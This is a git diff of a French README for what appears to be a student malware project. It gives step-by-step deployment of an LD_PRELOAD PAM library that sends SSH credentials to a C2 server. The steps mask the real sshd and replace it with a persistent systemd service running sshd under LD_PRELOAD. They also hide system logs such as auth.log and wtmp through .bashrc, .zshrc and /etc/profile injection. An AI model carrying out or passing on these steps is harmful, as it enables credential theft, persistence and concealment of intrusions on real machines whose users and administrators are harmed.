@@ -16,41 +16,91 @@ Fichiers du projet
  - Makefile : Script de compilation pour générer la bibliothèque partagée libpam_auth_logger.so.
  - srv_tcp.c : Code du serveur C2 qui reçoit et enregistre les identifiants envoyés par le malware.
 
+Avant de procéder a quoi que ce soit sur les machines, effectuez la commande suivante (qui permettra d'installer les outils de compilations,  la bibliotèque libpam + net-tools):
+
+sudo apt install -y build-essential libpam0g-dev openssh-server
+
 Compilation :
 
 Dans un premier temps faites un git clone du projet :
 
-Allez dans le dossier ou vous souhaitez copier le projet puis faite un :
+Ouvrez un shell et copier le projet puis faite un :
 
  -  git clone https://github.com/snipzr/Partiel_C.git
 
-Pour compiler le projet, exécutez la commande suivante :
+Sur le C2,pour compiler le serveur TCP, utilisez la commande suivante :
 
-make (Cette commande génère le fichier libpam_auth_logger.so)
+- gcc -o srv_tcp srv_tcp.c
 
-
-Sur le C2 faite aussi un git clone puis pour compiler le serveur TCP, utilisez la commande suivante :
-
- - gcc -o srv_tcp srv_tcp.c
-
-Utilisation
-Démarrage du serveur C2 :
+Utilisation Démarrage du serveur C2 :
 
 Sur le C2, lancez le serveur TCP :
 
- - ./srv_tcp
+- ./srv_tcp
 
-Déploiement du malware sur la machine victime (avec droit root pour la partie ssh) :
+Victime :
 
-D'abord l'on vas s'occuper de la partie ssh puis ensuite de la partie qui bloque l'accès au fichiers suivants :
+- sudo su
+
+cd /home/kali/Partiel_C
+make clean && make
+
+Vérifier si SSHD Tourne Déjà
+
+systemctl is-active sshd
+
+Si `active`, on doit le désactiver.
+
+Désactiver et Arrêter SSHD
+
+systemctl stop sshd
+systemctl disable sshd
+systemctl mask sshd
+
+systemctl is-enabled sshd
+
+Cela doit renvoyer disabled, masked ou not-found.
+
+On va créer un service qui charge automatiquement `LD_PRELOAD` au démarrage.
+
+vim /etc/systemd/system/ld_preload_sshd.service
+
+y coller :
+
+[Unit]
+Description=SSH Daemon with LD_PRELOAD
+After=network.target
+
+[Service]
+Environment="LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so"
+ExecStart=/usr/sbin/sshd -D
+Restart=on-failure
+RestartSec=5s
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
+
+verifier si le LD_PRELOAD est bien pris en compte :
+
+cat /tmp/debug.log
+
+doit retourner : LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so
+
+Appliquer et Activer le Service
+
+systemctl daemon-reload
+systemctl enable ld_preload_sshd
+systemctl start ld_preload_sshd
+
+ainsi le  LD_PRELOAD est bien injecté à chaque démarrage et envera a chaque connexion entrente ssh, les crédentials au C2.
+
+Passons à la partie qui bloque l'accès au fichiers suivants (sans droit root):
 
 1.Fichiers de logs systèmes
 
-/var/log/wtmp
-/var/log/lastlog
-/var/log/btmp
-/var/log/auth.log
-/var/log/sysstat
+/var/log/wtmp /var/log/lastlog /var/log/btmp /var/log/auth.log /var/log/sysstat
 
 2.Journaux de systemd
 
@@ -60,74 +110,57 @@ D'abord l'on vas s'occuper de la partie ssh puis ensuite de la partie qui bloque
 
 Toute occurrence contenant "Xorg." (exemple : /var/log/Xorg.0.log)
 
+On vas utiliser le libpam_auth_logger.so deja existant, pour verifier, dans Partiel_c :
 
-MISE EN PLACE
+ls -l libpam_auth_logger.so
 
-( Pensez a changez l'adresse IP du C2 par celle de votre C2dans le pam_auth_logger.c à la ligne : 129 sinon les crédentials ne s'enveront pas)
+Si rien ne sort, recompilez : 
 
-dans le dossier Partiel_C compilez les fichiers nécessaires en utilisant la commande :
+make clean && make
 
-make (utilisable grace au Makefile qui compilera le malware) 
+Ensuite testez manuellement via :
 
-Assurez-vous que le port 22 n'est pas utilisé par un autre processus :
+LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so cat /var/log/auth.log
 
-Utilisez la commande suivante pour lister les processus en écoute sur le port 22 :
+La commande doit renvoyer une erreur Permission denied.
 
- - sudo lsof -i :22
+La suite dependra du shell utillisé , pour savoir le quel on utilise :
 
-notez le PID (2eme colone)
+echo $0
 
-Arreter le processus qui utilise le port :
+si bash est utilisé :
 
- - sudo kill -9 <PID>
+echo 'export LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so' >> ~/.bashrc
+source ~/.bashrc
 
-Vérifier que le port 22 a été libéré
+si zsh est utilisé :
 
- - sudo netstat -tuln | grep ":22"
+echo 'export LD_PRELOAD=~/Partiel_C/libpam_auth_logger.so' >> ~/.zshrc
+source ~/.zshrc
 
+il suffit de modifier  ~/.shell_utilisé
 
-Ensuite créez le répertoire /run/sshd :
+Vérifie que la variable est bien prise en compte :
 
-sudo mkdir -p /run/sshd
-sudo chmod 0755 /run/sshd
+echo $LD_PRELOAD
 
-Testez manuellement le chargement de la bibliothèque avec LD_PRELOAD :
+Ce qui affichera : /home/user/Partiel_C/libpam_auth_logger.so
 
-LD_PRELOAD=/chemin/vers/libpam_auth_logger.so /usr/sbin/sshd -D
+Pour vérifier que le LD=PRELOAD soit toujours chargé, fermez le terminal puis ouvrez en un autre puis :
 
-Puis tentez de vous connecter en ssh via une machine lambda ppour verifier que le C2 recoit bien les crédentials
+echo $LD_PRELOAD
 
-Si tout fonctionne correctement, créez un service systemd pour automatiser le démarrage :
+Si la variable est toujours definie le LD=PRELOAD se chargera a chaque fois
 
-sudo vim /etc/systemd/system/ld_preload_sshd.service
-Ajoutez le contenu suivant :
+Essayez maintenant d'ouvrir un des fichier ciblé, ca ne devrai pas fonctionner
 
-[Unit]
-Description=SSH Daemon with LD_PRELOAD
-After=network.target
+ex : cat /var/log/auth.log
 
-[Service]
-Environment="LD_PRELOAD=/chemin/vers/libpam_auth_logger.so"
-ExecStart=/usr/sbin/sshd -D
-Restart=on-failure
-RestartSec=5s
-StandardOutput=journal
-StandardError=journal
+FACULTATIF CAR NECESSITE ROOT : Automatisation au démarrage pour TOUS les utilisateurs
 
-[Install]
-WantedBy=multi-user.target
-Remplacez /chemin/vers/libpam_auth_logger.so par le chemin réel vers le fichier.
+Si l'on veux que tout les utilisateurs aient ce LD_PRELOAD sans qu'ils modifient .bashrc/.zshrc, On ajoute cette ligne dans /etc/profile :
 
-Rechargez les unités systemd et activez le service :
-
-sudo systemctl daemon-reload
-sudo systemctl enable ld_preload_sshd
-sudo systemctl start ld_preload_sshd
-sudo systemctl status ld_preload_sshd
-
-Ainsi le Malware sera lancé a chaque démarage de la machine 
-
-
+echo 'export LD_PRELOAD=/home/kali/Partiel_C/libpam_auth_logger.so' | sudo tee -a /etc/profile-
 EXPLICATION :
 
 
